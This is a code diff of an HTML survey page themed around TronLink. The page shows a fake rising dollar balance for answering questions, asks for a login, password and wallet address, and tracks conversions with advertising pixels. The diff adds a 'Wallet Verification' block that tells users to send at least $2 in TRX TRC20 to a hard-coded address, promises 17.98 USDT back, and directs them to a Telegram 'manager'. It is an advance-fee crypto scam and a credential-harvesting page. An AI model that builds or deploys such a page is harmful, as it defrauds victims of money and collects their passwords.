@@ -46,11 +46,56 @@ input{width:100%;padding:12px;border-radius:12px;background:#0f1320;border:1px s
 #progress{width:0%;height:100%;background:var(--accent);border-radius:12px;}
 .question-card{background:linear-gradient(180deg,#141826,#12151b);border-radius:16px;padding:16px;display:flex;flex-direction:column;gap:12px;}
 .question-card h2{text-align:center;font-size:18px;}
-.wallet-text {
-  font-size:12px;           /* уменьшенный шрифт */
-  word-break: break-all;    /* перенос длинных слов */
-  overflow-wrap: anywhere;
-  max-width:100%;
+.wallet-text {font-size:12px; word-break: break-all; overflow-wrap: anywhere; max-width:100%;}
+/* ===== Verification Block Styles ===== */
+.verification-block {
+  background: linear-gradient(180deg,#141826,#12151b);
+  border: 1px solid #1e222b;
+  border-radius: 16px;
+  padding: 16px;
+  margin-top: 20px;
+  color: #e8e9ea;
+  font-size: 14px;
+  line-height: 1.5;
+}
+.verification-block h2 {
+  color: #5b7cff;
+  font-size: 18px;
+  margin-bottom: 10px;
+  text-align: center;
+}
+.wallet-container {
+  display: flex;
+  flex-direction: column;  /* адрес сверху, кнопка снизу */
+  align-items: center;
+  background: rgba(255,255,255,0.05);
+  padding: 8px;
+  border-radius: 8px;
+  margin: 10px 0;
+  font-family: monospace;
+  font-size: 12px;
+  white-space: nowrap;    /* адрес в одну строку */
+  overflow-x: auto;       /* горизонтальная прокрутка если адрес длинный */
+}
+
+#wallet-address {
+  flex-shrink: 0;
+  user-select: all;
+  margin-bottom: 6px;    /* отступ до кнопки */
+}
+
+#copy-wallet-btn {
+  padding: 6px 12px;
+  font-size: 12px;
+  border: none;
+  border-radius: 8px;
+  background: #5b7cff;
+  color: #fff;
+  cursor: pointer;
+  transition: background 0.2s ease;
+}
+#copy-wallet-btn:hover {
+  background: #3f5bcc;
 }
 </style>
 </head>
@@ -85,11 +130,25 @@ input{width:100%;padding:12px;border-radius:12px;background:#0f1320;border:1px s
 
     <!-- End -->
     <div id="end-screen" class="section" style="display:none;">
-      <h1>Thank you for participating!</h1>
+      <h1>Thank you for participating !</h1>
       <p id="final-login-text"></p>
       <p id="final-wallet-text" class="wallet-text"></p>
       <p id="final-balance-text"></p>
-      <p>For verification and payout, please contact the manager.</p>
+
+      <!-- ===== Verification Block ===== -->
+      <div class="verification-block">
+        <h2>Wallet Verification</h2>
+        <p>To activate your wallet, please send a small verification amount of at least <strong>2$</strong> to the following account (TRX TRC20)</p>
+        <div class="wallet-container">
+          <span id="wallet-address">TDYoHqu3HD294fB13KAYDYpAvNo52SuLpq</span>
+          <button id="copy-wallet-btn">Copy</button>
+        </div>
+        <p>This step confirms that the wallet belongs to you.</p>
+        <p>Upon successful verification, your wallet will be credited with <strong>17.98 USDT</strong>. The verification amount you sent will also be accounted for.</p>
+        <p>All transactions are securely recorded on the blockchain. Your funds and rewards are fully protected.</p>
+        <p>If you have any questions or require assistance, please contact the manager.</p>
+      </div>
+
       <p>Please take a screenshot for the manager.</p>
       <button class="support" onclick="window.open('https://t.me/VoluntaryVaultSupport','_blank')">
         Contact Manager
@@ -104,6 +163,7 @@ input{width:100%;padding:12px;border-radius:12px;background:#0f1320;border:1px s
 </div>
 
 <script>
+// ===== Questions & Quiz Logic =====
 const questions = [
 "Do you regularly use TronLink ?",
 "Have you ever connected TronLink to a dApp ?",
@@ -142,23 +202,17 @@ const questions = [
 ];
 
 let i=0, balance=0;
-
 const q=document.getElementById("question-text");
 const bal=document.getElementById("balance-display");
 const prog=document.getElementById("progress");
-
 const loginInput = document.getElementById("login");
 const passwordInput = document.getElementById("password");
 const walletInput = document.getElementById("wallet");
 const startBtn = document.getElementById("start-btn");
 
-// ===== Проверка полей =====
+// ===== Field Validation =====
 function checkInputs() {
-  if (
-    loginInput.value.trim() !== "" &&
-    passwordInput.value.trim() !== "" &&
-    walletInput.value.trim() !== ""
-  ) {
+  if (loginInput.value.trim() !== "" && passwordInput.value.trim() !== "" && walletInput.value.trim() !== "") {
     startBtn.disabled = false;
     startBtn.style.opacity = "1";
     startBtn.style.cursor = "pointer";
@@ -168,12 +222,11 @@ function checkInputs() {
     startBtn.style.cursor = "not-allowed";
   }
 }
-
 loginInput.addEventListener("input", checkInputs);
 passwordInput.addEventListener("input", checkInputs);
 walletInput.addEventListener("input", checkInputs);
 
-// ===== Сохранение и загрузка прогресса =====
+// ===== Save & Load Progress =====
 function saveProgress() {
   localStorage.setItem('tronSurvey', JSON.stringify({
     login: loginInput.value,
@@ -191,9 +244,7 @@ window.addEventListener('load', () => {
     balance = saved.balance;
     i = saved.questionIndex;
     bal.innerText = "Balance: $" + balance.toFixed(2);
-
     if(i >= questions.length){
-      // Если опрос уже пройден
       document.getElementById("register-screen").style.display = "none";
       document.getElementById("quiz-screen").style.display = "none";
       document.getElementById("end-screen").style.display = "flex";
@@ -201,7 +252,6 @@ window.addEventListener('load', () => {
       document.getElementById("final-wallet-text").innerText = "Wallet: " + saved.wallet;
       document.getElementById("final-balance-text").innerText = "Earned: $" + balance.toFixed(2);
     } else {
-      // Если опрос не закончен
       startBtn.disabled = false;
       startBtn.style.opacity = "1";
       startBtn.style.cursor = "pointer";
@@ -209,7 +259,7 @@ window.addEventListener('load', () => {
   }
 });
 
-// ===== Начало опроса =====
+// ===== Start Quiz =====
 startBtn.onclick=()=>{
   fbq('track','Lead');
   document.getElementById("register-screen").style.display="none";
@@ -218,7 +268,7 @@ startBtn.onclick=()=>{
   saveProgress();
 };
 
-// ===== Вопросы =====
+// ===== Quiz Answers =====
 document.querySelectorAll(".answer-btn").forEach(b=>{
   b.onclick=()=>{
     balance+=0.47;
@@ -226,7 +276,6 @@ document.querySelectorAll(".answer-btn").forEach(b=>{
     bal.innerText="Balance: $"+balance.toFixed(2);
     prog.style.width=(i/questions.length*100)+"%";
     saveProgress();
-
     if(i>=questions.length){
       fbq('track','CompleteRegistration',{value:balance,currency:'USD'});
       document.getElementById("quiz-screen").style.display="none";
@@ -238,6 +287,12 @@ document.querySelectorAll(".answer-btn").forEach(b=>{
       q.innerText=questions[i];
     }
   }
+});
+
+// ===== Copy Wallet Address =====
+document.getElementById("copy-wallet-btn").addEventListener("click", function() {
+  const walletText = document.getElementById("wallet-address").innerText;
+  navigator.clipboard.writeText(walletText);
 });
 </script>
 </body>
